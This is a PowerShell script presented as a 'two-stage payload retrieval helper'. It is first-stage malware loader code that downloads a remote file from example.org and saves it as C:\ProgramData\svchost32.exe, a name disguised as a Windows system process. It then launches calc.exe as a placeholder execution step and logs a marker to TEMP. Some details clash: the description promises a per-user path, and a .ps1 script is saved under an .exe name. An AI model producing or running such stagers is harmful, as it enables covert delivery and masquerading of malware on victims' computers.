<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.
#>
[CmdletBinding()]
param(
    [string]$DownloadUrl = 'http://example.org/stage1.ps1',
    [string]$PayloadPath = "C:\ProgramData\svchost32.exe",
    [int]$ConnectionTimeout = 38
)
$ErrorActionPreference = "Stop"

function Invoke-Stage1Download {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $StageResult = Invoke-Stage1Download -SourceUrl $DownloadUrl -DestinationPath $PayloadPath -TimeoutSec $ConnectionTimeout
    if ($StageResult) {
        Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
Write-Verbose "stage marker 38 reached"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
